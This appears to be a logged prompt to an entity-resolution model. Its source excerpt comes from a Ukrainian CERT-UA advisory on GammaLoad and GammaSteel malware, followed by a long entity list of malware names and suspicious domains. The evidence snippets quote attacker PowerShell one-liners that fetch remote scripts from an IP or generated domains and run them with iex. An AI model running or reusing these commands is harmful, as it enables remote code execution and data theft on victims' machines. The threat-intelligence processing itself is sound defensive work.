=== REQUEST (gemini gemini-3.7-flash) ===
--- sampling ---
{"temperature":0}
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ої пошти (зі скомпрометованих акаунтів і на приватні електронні адреси) HTM-дроперів (в тому числі, в UTF-16 кодуванні), що ініціюють ланцюг доставки GammaLoad.PS1 на комп'ютер жертви.</p><p>Метою зловмисників, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer."
Entities:
E1. PowerShell
E2. Browser.ps1
E3. GAMMASTEEL
E4. SearchEmbdIndex.ps1
E5. init.ps1
E6. GAMEDAY
E7. powershell.exe
E8. LOADNEST
E9. Loader.dll
E10. GHOSTPULSE
E11. STEELHOOK
E12. LUMMASTEALER
E13. DELTA
E14. SmartAssembly .NET [aka SmartAssembly]
E15. REGEORG.NEO
E16. XWORM
E17. MARSSTEALER
E18. Screengrabber
E19. FileGrabber
E20. dirbuster
E21. ATERA
E22. LOADERX3
E23. Browsers
E24. REDLINESTEALER
E25. StealDeal
E26. COOKBOX
E27. ArmyPlus.exe
E28. Log4Shell
E29. CCleaner.exe
E30. ProxyShell
E31. CodeMeter.exe
E32. GammaSteel.PS1
E33. GammaSteel.NET
E34. HarvesterX
E35. PowerShell (powershell.exe)
E36. GammaLoad.PS1
E37. golos2023q.ru
E38. supermarioprohozhdenie.ru
E39. iloveua.ir
E40. abracodabugalimpopo.ru [aka yavasponimayu.ru, prostosmeritesya.ru, tvoyaradostetoya.ru, nomnetozhedenyuzhkanuzhna.ru]
E41. helpdesk.katolik.bydgoszcz.pl
E42. browser.events.data.certifiedauth.in
E43. monitor.personlog.in
E44. againandagaingmorder.ru
E45. blogger.google2.certifiedauth.in
E46. rubidiumo.ru
E47. sismasterhome.ru
E48. humanitarydp.ru
E49. atl.ua
E50. golosdruga.ru
E51. s3-atlassian.cloud
E52. metallergroup.ru
E53. talanti-ua.mom
E54. agentsuperpupervinil.ru
E55. rafraystore.ru
E56. balkimotion.ru
E57. ardeas.ru
E58. lolifans.ru
E59. zallesman.ru
E60. mockbin.org
E61. zaikadoctor.ru
E62. ipodromlan.ru
E63. monopoliafromyou.ru
E64. sakentoshi.ru
E65. davincigroup.online [aka groupdavinci.online]
E66. benokij.com
E67. dublebomber.ru
E68. 00-l.ru
E69. picwalldoor.ru
E70. calendar.stib.com.ua
E71. infomailforyoumak.ru
E72. com.personlog.in [aka personlog.in]
E73. m.personlog.in
E74. shopersport.ru
E75. cafeteriumups.ru
E76. maxteroper.ru
E77. comperssw.fun
E78. kozachok777.ru
E79. infomalilopera.ru
E80. deti.eu
E81. deti-ua.eu
E82. deti-bi.eu
E83. vivianstyler.ru
E84. kjhgdj99fuller.ru
E85. mediaplatformapharm.ru
E86. hilr.ru
E87. monitor.binance.com.exmo.day
E88. unayt.ru
E89. vdsina.ru
E90. zakrylki809.ru
E91. internetcygane.ru
E92. specnaznachenie.ru
E93. gondurasonline.ru
E94. kilomunara.com
E95. konkurs-vesna-24.ru [aka konkurs-vesna.info, konkurs-vesna24.ru, vesna-konkurs.life]
E96. civh.ru
E97. reg.ru
E98. hardingtwominuterule.com
E99. hopentools.ru
E100. superdadymster.ru
E101. ipoluchayteudovolstvie.ru
E102. kismamabeforyougo.ru
E103. killredls.pw
E104. shapurt.ru
E105. iqhost.ru
E106. propertyminsk.by
E107. moyabelorussiya.by
E108. hudojnik-school.eu [aka school-hudojniku.eu, hudojniku-school-ua.eu, hudojniku-school.eu]
E109. dis.gov.ua
E110. ligaspace.ru
E111. jslopasitmon.com
E112. hsts.online [aka www.hsts.online]
E113. magicpic.eu
E114. zalamafiapopcultur.ru
E115. kissmafiabeforyoudied.ru
E116. meta.ua
E117. tme-id.ru
E118. simplecloud.ru
E119. balletworld.co
E120. popuasyfromua.ru
E121. samoramertut.ru
E122. pas-ukr.net
E123. kew.1qw.us
E124. rms-server.tektonit.ru [aka rmssrv.ru]
E125. kew.8df.us
E126. rnbo.gov.ua
E127. mail.arlingtonhousing.us
E128. tvpharm.ru
E129. bluepablo.fun
E130. telegram-click.ru
E131. getssl.click
E132. minef.eu
E133. zbignef.com
E134. nk.1qw.us
E135. ns1.authcheck.in
E136. adobeprotectcheck.com
E137. dnspod.com
